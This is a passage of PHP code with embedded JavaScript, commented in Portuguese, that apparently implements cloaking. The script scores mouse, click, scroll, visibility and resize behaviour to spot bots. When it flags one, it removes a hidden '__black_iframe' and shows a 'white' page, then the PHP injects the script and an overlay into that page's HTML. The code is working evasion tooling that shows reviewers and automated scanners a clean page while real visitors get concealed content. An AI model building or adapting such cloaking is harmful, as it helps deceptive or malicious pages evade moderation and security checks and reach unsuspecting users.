            clickEvents.push({x: e.clientX, y: e.clientY, t: Date.now()});
            
            if (clickEvents.length > 10) clickEvents.shift();
            
            // Verifica cliques em mesma posicao exata (5+ cliques identicos = automacao)
            if (clickEvents.length >= 5) {
                var samePos = 0;
                for (var i = 1; i < clickEvents.length; i++) {
                    if (clickEvents[i].x === clickEvents[i-1].x && 
                        clickEvents[i].y === clickEvents[i-1].y) {
                        samePos++;
                    }
                }
                // Apenas se 4+ cliques na mesma posicao exata
                if (samePos >= 4) {
                    botIndicators += 50;
                    console.log('[Monitor] Muitos cliques em posicao identica');
                }
            }
            
            // Cliques MUITO rapidos (< 20ms = impossivel para humano)
            if (clickEvents.length >= 2) {
                var last = clickEvents[clickEvents.length - 1];
                var prev = clickEvents[clickEvents.length - 2];
                if (last.t - prev.t < 20) {
                    botIndicators += 30;
                    console.log('[Monitor] Cliques imposssivelmente rapidos');
                }
            }
        };
        
        // 4. Detecta tentativa de screenshot (visibilidade muda rapidamente)
        // NOTA: Muitos usuarios alternam abas, isso NAO deve penalizar
        var visibilityChanges = 0;
        var visHandler = function() {
            visibilityChanges++;
            // Apenas se mudar MUITAS vezes em pouco tempo (> 10 vezes)
            if (visibilityChanges > 10) {
                botIndicators += 10;
                console.log('[Monitor] Muitas mudancas de visibilidade');
            }
        };
        
        // 5. Detecta resize rapido (bots ajustam viewport)
        // NOTA: Usuarios podem redimensionar janela, isso e normal
        var resizeCount = 0;
        var resizeHandler = function() {
            resizeCount++;
            // Apenas se redimensionar MUITAS vezes (> 10)
            if (resizeCount > 10) {
                botIndicators += 10;
                console.log('[Monitor] Muitos resizes');
            }
        };
        
        // Adiciona listeners
        document.addEventListener('mousemove', mouseHandler, true);
        document.addEventListener('scroll', scrollHandler, true);
        document.addEventListener('click', clickHandler, true);
        document.addEventListener('visibilitychange', visHandler, true);
        window.addEventListener('resize', resizeHandler, true);
        
        // Funcao para verificar movimento linear
        function checkLinearMovement(points) {
            if (points.length < 5) return false;
            
            // Calcula se pontos estao em linha reta
            var dx = points[points.length-1].x - points[0].x;
            var dy = points[points.length-1].y - points[0].y;
            var totalDist = Math.sqrt(dx*dx + dy*dy);
            
            if (totalDist < 50) return false; // Movimento muito pequeno
            
            // Soma das distancias individuais
            var sumDist = 0;
            for (var i = 1; i < points.length; i++) {
                var ddx = points[i].x - points[i-1].x;
                var ddy = points[i].y - points[i-1].y;
                sumDist += Math.sqrt(ddx*ddx + ddy*ddy);
            }
            
            // Se soma das distancias e quase igual a distancia direta = linha reta
            var ratio = sumDist / totalDist;
            return ratio < 1.05; // Menos de 5% de desvio = muito reto
        }
        
        // Funcao para calcular velocidade do mouse
        function checkMouseSpeed(points) {
            if (points.length < 2) return 0;
            
            var totalDist = 0;
            var totalTime = points[points.length-1].t - points[0].t;
            
            for (var i = 1; i < points.length; i++) {
                var dx = points[i].x - points[i-1].x;
                var dy = points[i].y - points[i-1].y;
                totalDist += Math.sqrt(dx*dx + dy*dy);
            }
            
            if (totalTime === 0) return 99999;
            return (totalDist / totalTime) * 1000; // pixels por segundo
        }
        
        // Funcao para redirecionar para white
        function redirectToWhite() {
            console.log('[Monitor] BOT DETECTADO POS-IFRAME! Redirecionando para white');
            
            // Remove listeners
            document.removeEventListener('mousemove', mouseHandler, true);
            document.removeEventListener('scroll', scrollHandler, true);
            document.removeEventListener('click', clickHandler, true);
            document.removeEventListener('visibilitychange', visHandler, true);
            window.removeEventListener('resize', resizeHandler, true);
            
            // Remove iframe
            var iframe = document.getElementById('__black_iframe');
            if (iframe) iframe.remove();
            
            // Mostra white (ja esta no HTML por tras)
            // Ou redireciona se tiver URL
            if (whiteUrl) {
                window.location.replace(whiteUrl);
            } else {
                // Apenas remove iframe, white aparece
                document.body.style.display = 'block';
            }
        }
        
        // Verifica periodicamente
        var checkInterval = setInterval(function() {
            // Combina score local com score do iframe
            var combinedScore = botIndicators + iframeBotScore;
            
            console.log('[Monitor] Bot indicators - Local:', botIndicators, 'Iframe:', iframeBotScore, 'Combined:', combinedScore);
            
            // THRESHOLDS ALTOS - apenas bots obvios sao redirecionados
            // Score >= 150 = deteccao critica (webdriver, headless, automacao)
            if (combinedScore >= 150) {
                clearInterval(checkInterval);
                console.log('[Monitor] BOT DETECTADO! Score combinado:', combinedScore);
                redirectToWhite();
            }
            
            // Se apenas score do iframe >= 150, tambem redireciona (automacao detectada no iframe)
            if (iframeBotScore >= 150) {
                clearInterval(checkInterval);
                console.log('[Monitor] BOT DETECTADO pelo iframe! Score:', iframeBotScore);
                redirectToWhite();
            }
            
            // Para de monitorar apos 10 segundos
            if (Date.now() - monitorStart > monitorDuration) {
                console.log('[Monitor] Monitoramento finalizado - usuario limpo');
                clearInterval(checkInterval);
                
                // Remove listeners
                document.removeEventListener('mousemove', mouseHandler, true);
                document.removeEventListener('scroll', scrollHandler, true);
                document.removeEventListener('click', clickHandler, true);
                document.removeEventListener('visibilitychange', visHandler, true);
                window.removeEventListener('resize', resizeHandler, true);
            }
        }, 1000);
    }
    
})();
</script>
JS;

    // Monta HTML final
    // Injeta CSS no head
    if (preg_match('/<head[^>]*>/i', $whiteHtml)) {
        $whiteHtml = preg_replace('/<head([^>]*)>/i', '<head$1>' . $css, $whiteHtml, 1);
    } else {
        $whiteHtml = '<head>' . $css . '</head>' . $whiteHtml;
    }
    
    // Injeta overlay no body
    if (preg_match('/<body[^>]*>/i', $whiteHtml)) {
        $whiteHtml = preg_replace('/<body([^>]*)>/i', '<body$1>' . $overlay, $whiteHtml, 1);
    } else {
        $whiteHtml = '<body>' . $overlay . $whiteHtml . '</body>';
    }
    
    // Injeta JS no final
    if (stripos($whiteHtml, '</body>') !== false) {
        $whiteHtml = str_ireplace('</body>', $js . '</body>', $whiteHtml);
    } else {
        $whiteHtml .= $js;
    }
    
    return $whiteHtml;
}
